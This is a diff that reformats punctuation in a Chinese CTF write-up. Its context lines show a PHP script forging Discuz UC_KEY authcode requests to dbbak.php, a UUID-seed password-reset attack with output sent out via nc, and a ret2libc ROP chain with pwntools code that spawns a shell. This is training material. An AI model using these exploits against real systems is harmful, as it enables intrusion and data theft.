@@ -27,7 +27,7 @@ draft: false
 查看源码有一个修改密码发送 Token 的模块，重点关注直接修改管理员密码
 
 有一个 UUID8，UUID 生成要用到 random，而上面设置了 seed 到 startup time，
-翻源码+网络控制台可知有一个 api 在登录状态下会一直发送 startup time，注册一个账号，
+翻源码 + 网络控制台可知有一个 api 在登录状态下会一直发送 startup time，注册一个账号，
 登录，然后拿到 startup time
 
 #### 构造脚本
@@ -39,7 +39,7 @@ UUID8 生成脚本搞了一圈没搞定，在搜索的时候发现 py3.14 rc2 �
 
 #### 找 flag
 
-最后，尝试着执行一些命令、想办法找到 flag，使用 nc 将结果输出到服务器（看着场景比较简单，没用反弹shell（因为我还不会反弹shell））
+最后，尝试着执行一些命令、想办法找到 flag，使用 nc 将结果输出到服务器（看着场景比较简单，没用反弹 shell（因为我还不会反弹 shell））
 
 ### ez_bottle
 
@@ -122,7 +122,7 @@ $targetUrl = "";
 $UC_KEY = "N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb";
 $apptype = "discuzx";
 
-// 从dbbak.php提取的加密函数
+// 从 dbbak.php 提取的加密函数
 function _authcode($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
     $ckey_length = 4;
     $key = md5($key ? $key : '');
@@ -184,11 +184,11 @@ $get = [
 $queryString = http_build_query($get);
 $code = _authcode($queryString, 'ENCODE', $UC_KEY);
 
-// 3. 构造最终请求URL
+// 3. 构造最终请求 URL
 $requestUrl = $targetUrl."?apptype=".$apptype."&code=".urlencode($code);
 
-// 4. 发送HTTP请求
-echo "正在发送请求到: ".$requestUrl."\n\n";
+// 4. 发送 HTTP 请求
+echo "正在发送请求到：".$requestUrl."\n\n";
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $requestUrl);
@@ -201,42 +201,42 @@ curl_close($ch);
 echo $response;
 
 // 5. 处理响应
-echo "HTTP状态码: ".$httpCode."\n";
+echo "HTTP 状态码：".$httpCode."\n";
 echo "响应内容:\n";
 echo "----------------------------------------\n";
 
 if($httpCode == 200) {
-    // 尝试解析XML响应
+    // 尝试解析 XML 响应
     $xml = @simplexml_load_string($response);
     if($xml !== false) {
         echo "备份操作结果:\n";
 
         // 显示错误信息（如果有）
         if(isset($xml->error)) {
-            echo "错误代码: ".$xml->error['errorCode']."\n";
-            echo "错误信息: ".$xml->error['errorMessage']."\n";
+            echo "错误代码：".$xml->error['errorCode']."\n";
+            echo "错误信息：".$xml->error['errorMessage']."\n";
         }
 
         // 显示文件信息（成功时）
         if(isset($xml->fileinfo)) {
             echo "\n备份文件信息:\n";
-            echo "文件序号: ".$xml->fileinfo->file_num."\n";
-            echo "文件大小: ".$xml->fileinfo->file_size." bytes\n";
-            echo "文件名: ".$xml->fileinfo->file_name."\n";
-            echo "文件URL: ".$xml->fileinfo->file_url."\n";
-            echo "最后修改: ".date('Y-m-d H:i:s', $xml->fileinfo->last_modify)."\n";
+            echo "文件序号：".$xml->fileinfo->file_num."\n";
+            echo "文件大小：".$xml->fileinfo->file_size." bytes\n";
+            echo "文件名：".$xml->fileinfo->file_name."\n";
+            echo "文件 URL: ".$xml->fileinfo->file_url."\n";
+            echo "最后修改：".date('Y-m-d H:i:s', $xml->fileinfo->last_modify)."\n";
         }
 
-        // 显示下一卷URL（分卷备份时）
+        // 显示下一卷 URL（分卷备份时）
         if(isset($xml->nexturl) && !empty($xml->nexturl)) {
-            echo "\n下一卷URL:\n".$xml->nexturl."\n";
+            echo "\n下一卷 URL:\n".$xml->nexturl."\n";
         }
     } else {
-        // 非XML响应直接输出
+        // 非 XML 响应直接输出
         echo $response;
     }
 } else {
-    echo "请求失败，HTTP状态码: ".$httpCode."\n";
+    echo "请求失败，HTTP 状态码：".$httpCode."\n";
     echo $response;
 }
 
@@ -252,15 +252,15 @@ echo "\n----------------------------------------\n";
 
 ### 签到
 
-对拿到的三个文件 `file` 一下, 发现要用加载器来运行 `./ld-linux-x86-64.so.2 --library-path . ./pwn`, 而且 `pwn` 是 `not stripped` 的, 可以方便地查看各种函数。
+对拿到的三个文件 `file` 一下，发现要用加载器来运行 `./ld-linux-x86-64.so.2 --library-path . ./pwn`, 而且 `pwn` 是 `not stripped` 的，可以方便地查看各种函数。
 
-`checksec` 一下, 发现没有栈保护 (No Canary), 地址不会随机化 (No PIE), 某些内存区域不可执行 (NX enabled)。
+`checksec` 一下，发现没有栈保护 (No Canary), 地址不会随机化 (No PIE), 某些内存区域不可执行 (NX enabled)。
 
-尝试运行程序, 发现输入过长的 A 会 `SIGSEV`, 可以栈溢出。
+尝试运行程序，发现输入过长的 A 会 `SIGSEV`, 可以栈溢出。
 
 #### 漏洞分析
 
-用 IDA 打开, 分析 `main` 函数。
+用 IDA 打开，分析 `main` 函数。
 
 ```asm
 ; Attributes: bp-based frame
@@ -309,19 +309,19 @@ main endp
 _text ends
 ```
 
-显然, 程序在栈上开辟了 `0x70` 的缓冲区, 却调用 `read` 函数试图读入 `0x200` 的数据, 存在栈溢出漏洞。
-经过计算, 覆盖到返回地址需要 `112 (buf) + 8 (rbp) = 120` 字节的填充。
+显然，程序在栈上开辟了 `0x70` 的缓冲区，却调用 `read` 函数试图读入 `0x200` 的数据，存在栈溢出漏洞。
+经过计算，覆盖到返回地址需要 `112 (buf) + 8 (rbp) = 120` 字节的填充。
 
 #### 攻击思路
 
-检查函数列表, 没有发现 `win` 或 `get_shell` 之类的后门函数, 做不了 `ret2text`。
+检查函数列表，没有发现 `win` 或 `get_shell` 之类的后门函数，做不了 `ret2text`。
 
-由于 `NX` 开启, 无法直接执行栈上的 shellcode。
-但我们可以劫持程序执行流,
-跳转到 `libc` 中现有的 `system` 函数, 执行 `system("/bin/sh")` 来获取 shell。
+由于 `NX` 开启，无法直接执行栈上的 shellcode。
+但我们可以劫持程序执行流，
+跳转到 `libc` 中现有的 `system` 函数，执行 `system("/bin/sh")` 来获取 shell。
 
-然而, 由于 ASLR 的存在, `libc` 的基地址每次运行都是随机的。
-因此, 攻击分两步:
+然而，由于 ASLR 的存在，`libc` 的基地址每次运行都是随机的。
+因此，攻击分两步：
 
 1. 先用一个 `libc` 函数的真实地址来计算基址
 2. 再利用这个基址来计算 `system` 的地址并调用
@@ -329,8 +329,8 @@ _text ends
 #### 计算 `libc` 基地址
 
 我们的目标是诱导程序执行 `puts(puts@got)`。
-`puts@got` 中存放着 `puts` 函数在内存中的真实地址,
-调用 `puts` 把它打印出来, 我们就能知道这个地址。
+`puts@got` 中存放着 `puts` 函数在内存中的真实地址，
+调用 `puts` 把它打印出来，我们就能知道这个地址。
 （当然，之后我们应诱导重进 `main`，
 而非重启程序，因为重启之后基地址又变了。）
 
@@ -343,31 +343,31 @@ _text ends
 ROPgadget --binary ./pwn --only "pop rdi|ret"
 ```
 
-构建 Payload 1, 我们的 ROP 链要做三件事:
+构建 Payload 1, 我们的 ROP 链要做三件事：
 
 - 将 `puts@got` 的地址放入 `rdi` 寄存器。
 - 调用 `puts@plt`。
-- 执行完后, 返回 `main` 函数的开头, 以便我们进行第二次攻击。
+- 执行完后，返回 `main` 函数的开头，以便我们进行第二次攻击。
 
 ```python
 rop_chain_1 = p64(pop_rdi)       # 执行 pop rdi; ret
 rop_chain_1 += p64(puts_got)     # 将 puts@got 的地址放入 rdi
 rop_chain_1 += p64(puts_plt)     # 调用 puts
-rop_chain_1 += p64(main_addr)    # puts 返回后, 重新执行 main
+rop_chain_1 += p64(main_addr)    # puts 返回后，重新执行 main
 ```
 
 #### Get Shell
 
-拿到 `puts` 的真实地址后, 减去它在 `libc` 文件中的偏移,
+拿到 `puts` 的真实地址后，减去它在 `libc` 文件中的偏移，
 就算出了 `libc` 的基地址。
-然后, 就可以计算出 `system` 和 `"/bin/sh"` 的精确地址。
+然后，就可以计算出 `system` 和 `"/bin/sh"` 的精确地址。
 
-解决栈对齐问题, 在64位系统中, 调用函数时要求栈是16字节对齐的。
-我们的 ROP 链从 `main` 函数 `ret` (弹出8字节) 开始,
+解决栈对齐问题，在 64 位系统中，调用函数时要求栈是 16 字节对齐的。
+我们的 ROP 链从 `main` 函数 `ret` (弹出 8 字节) 开始，
 破坏了对齐。如果直接调用 `system`, 会导致 `SIGSEGV`。
 
-解决方案: 在调用 `system` 之前, 先跳转到一个 `ret` gadget,
-它会再弹出8字节, 从而让栈 `(8+8=16)` 重新对齐。
+解决方案：在调用 `system` 之前，先跳转到一个 `ret` gadget,
+它会再弹出 8 字节，从而让栈 `(8+8=16)` 重新对齐。
 
 构建 Payload 2, 这次的 ROP 链目标是执行 `system("/bin/sh")`。
 
@@ -380,7 +380,7 @@ rop_chain_2 += p64(system_addr)  # 调用 system
 
 #### 最终 Exploit 脚本
 
-将上述思路整合, 编写 `pwntools` 脚本。
+将上述思路整合，编写 `pwntools` 脚本。
 
 ```python
 from pwn import *
@@ -424,7 +424,7 @@ p.sendline(payload2)
 p.interactive()
 ```
 
-运行脚本, 成功拿到 shell
+运行脚本，成功拿到 shell
 
 ```shell
 ls
